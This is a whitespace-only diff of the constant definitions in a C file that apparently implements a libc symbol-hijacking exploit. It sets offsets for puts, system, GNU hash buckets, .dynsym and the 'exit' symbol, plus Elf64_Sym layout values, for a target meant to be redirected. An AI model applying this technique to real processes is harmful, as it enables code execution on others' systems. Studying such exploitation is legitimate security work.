@@ -17,23 +17,23 @@
 #include <sys/mman.h>
 
 // These offsets are libc-specific
-#define PUTS_OFFSET			0x84420
-#define SYSTEM_OFFSET		0x52290
-#define BITMASK_OFFSET		0x3c8
-#define BUCKETS_OFFSET		0xbc8
-#define CHAIN_ZERO_OFFSET	0x1b64
-#define DYNSYM_OFFSET		0x4070    	// .dynsym start
-#define EXIT_STR_OFFSET		0x2efb		// string "exit" offset in .dynstr, for sym->st_name
-#define EXIT_SYM_INDEX		0X87		// 135, true bucket
+#define PUTS_OFFSET         0x84420
+#define SYSTEM_OFFSET       0x52290
+#define BITMASK_OFFSET      0x3c8
+#define BUCKETS_OFFSET      0xbc8
+#define CHAIN_ZERO_OFFSET   0x1b64
+#define DYNSYM_OFFSET       0x4070    	// .dynsym start
+#define EXIT_STR_OFFSET     0x2efb		// string "exit" offset in .dynstr, for sym->st_name
+#define EXIT_SYM_INDEX      0X87		// 135, true bucket
 
 // Extract from GDB or retrieve in script before unmapped
-#define BITMASK_WORD		0xf000028c2200930e
-#define BUCKET				0x86		// bucket to start iterate				
-#define NBUCKETS			0x3f3
+#define BITMASK_WORD        0xf000028c2200930e
+#define BUCKET              0x86		// bucket to start iterate				
+#define NBUCKETS            0x3f3
 
 // These values are fixed for Elf64_Sym structure in 64-bit system
-#define ST_VALUE_OFFSET		0x8			
-#define ST_SIZE				0x18
+#define ST_VALUE_OFFSET     0x8			
+#define ST_SIZE             0x18
 
 // Values of the members in symbol table for hijaced target 
 #define ELF64_ST_INFO(bind, type) (((bind) << 4) | ((type) & 0x0F)) // Construct st_info from binding and type
